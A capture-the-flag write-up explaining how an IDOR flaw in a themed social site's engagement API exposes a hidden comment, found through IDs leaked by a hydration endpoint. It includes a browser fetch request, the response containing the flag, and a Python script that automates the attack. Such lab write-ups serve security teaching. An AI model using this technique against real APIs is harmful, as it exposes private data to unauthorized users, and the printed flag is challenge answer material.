Hidden Comment IDOR Challenge - Writeup by Team Exploit4

When I opened the challenge URL, I saw this Game of Thrones themed social media site called "Kaal Media Hub - The Realm". Pretty cool design with all the medieval aesthetics and gold colors. The site had posts (they called them "Dispatches") and comments (called "Ravens"). 

The challenge description said there's a hidden comment on a post with disabled comments, so I knew I had to find a way to access something that shouldn't be visible. First thing I did was create an account - clicked "Swear Allegiance" and registered with some random credentials. Once logged in, I could see the feed with just one post by a user named "victim" with the title "My character design". The interesting part was that this post showed "The ravens have been silenced" which meant comments were disabled. No comments were visible on this post, so this had to be the target.

I opened DevTools (F12) and started poking around. I checked the Network tab to see what API calls were being made and looked through the JavaScript source code to understand how the app worked. While reading through the main page source, I noticed something interesting - there was code that dynamically loaded a script from /api/hydration. I've seen these hydration endpoints before in React apps, they're used to preload data for better performance.

I decided to check out this endpoint directly by navigating to http://chall-35421a42.evt-207.glabs.ctf7.com/api/hydration in my browser. The response was JavaScript code that looked like this:

window.__ENTITY_IDS__ = window.__ENTITY_IDS__ || {};
Object.assign(window.__ENTITY_IDS__, {
  "1": ["c0mm3nt-h1dd3n-4ee7-b337-d1sc10s3d"]
});

Jackpot! The hydration endpoint was leaking entity IDs. For post ID 1 (the one with disabled comments), there was a comment ID: c0mm3nt-h1dd3n-4ee7-b337-d1sc10s3d. The ID itself was a hint with "c0mm3nt", "h1dd3n", and "d1sc10s3d" in it. This was definitely the hidden comment I needed to access.

Now I had the comment ID, but I needed to figure out how to actually retrieve it. I went back to the JavaScript code and looked at how the app handled comment interactions. I found that when users click the "Honour" button to like a comment, it sends a POST request to /api/v2/engagement with the comment ID. I thought maybe I could use the same endpoint with the hidden comment ID.

I opened the browser console and used fetch to make the request:

fetch('/api/v2/engagement', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    action: 'heart',
    entityType: 'Comment',
    entityId: 'c0mm3nt-h1dd3n-4ee7-b337-d1sc10s3d'
  })
}).then(r => r.json()).then(console.log);

The response came back with:

{
  "success": true,
  "score": 1,
  "updatedTarget": {
    "type": "Comment",
    "id": "c0mm3nt-h1dd3n-4ee7-b337-d1sc10s3d",
    "body": "Admin only note: Kaal{h1dd3n_c0mm3nt_1d0r_byp4ss_282ad848}",
    "hearts": 1
  }
}

Got it! The flag was right there in the comment body. The vulnerability was pretty clear - the engagement endpoint didn't check if the user should have access to that comment. It didn't verify if the comment belonged to a post with disabled comments or if it was supposed to be hidden. It just accepted any valid comment ID and returned the full data.

This is a classic IDOR (Insecure Direct Object Reference) vulnerability combined with an information disclosure issue. The hydration endpoint leaked the internal IDs, and the engagement endpoint failed to enforce proper access controls. In a real application, this could expose private messages, admin notes, or any hidden content to unauthorized users.

The fix would be straightforward - the API should check if the requesting user has permission to access the comment before returning any data. Just because something is hidden in the UI doesn't mean it's protected on the backend. Every API endpoint needs proper authorization checks.

Flag: Kaal{h1dd3n_c0mm3nt_1d0r_byp4ss_282ad848}

For anyone wanting to automate this, here's a quick Python script:

import requests
import re

BASE_URL = "http://chall-35421a42.evt-207.glabs.ctf7.com"
s = requests.Session()

s.post(f"{BASE_URL}/api/register", json={"username": "test123", "password": "pass123"})

r = s.get(f"{BASE_URL}/api/hydration")
comment_id = re.search(r'"1":\["([^"]+)"\]', r.text).group(1)

r = s.post(f"{BASE_URL}/api/v2/engagement", json={
    "action": "heart",
    "entityType": "Comment",
    "entityId": comment_id
})

print(r.json()['updatedTarget']['body'])

Team Exploit4
